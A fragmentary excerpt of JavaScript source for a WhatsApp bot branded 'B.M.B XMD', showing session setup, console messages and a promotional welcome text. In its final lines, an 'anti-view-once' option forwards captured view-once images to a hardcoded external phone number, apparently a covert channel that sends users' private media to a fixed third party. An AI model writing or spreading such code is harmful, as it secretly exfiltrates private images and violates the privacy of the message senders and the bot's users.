...
const sessdata = config.SESSION_ID.replace("𝙱.𝙼.𝙱-𝚇𝙼𝙳~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting 𝙱.𝙼.𝙱 𝚇𝙼𝙳 to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing 𝙱.𝙼.𝙱 𝚇𝙼𝙳 Plugins')
  const path = require('path');
  ...
  let up = `*Hello there ✦ CASEY ✦ 𝙱.𝙼.𝙱 ✦ 𝚇𝙼𝙳 ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by 𝙱.𝙼.𝙱 𝚇𝙼𝙳 INC. \ud83c\udf8a, Meet ✦ 𝙱.𝙼.𝙱 𝚇𝙼𝙳 ✦ WhatsApp Bot.\n\n *Thanks for using ✦ CASEY ✦ 𝙱.𝙼.𝙱 𝚇𝙼𝙳 ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VawO6hgF6sn7k3SuVU3z\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/bmb-tz/B.M.B-TECH\n\n> © Powered BY ✦ 𝙱.𝙼.𝙱 ✦ 𝚇𝙼𝙳 ✦ \ud83d\udda4`;
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("255767862455@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
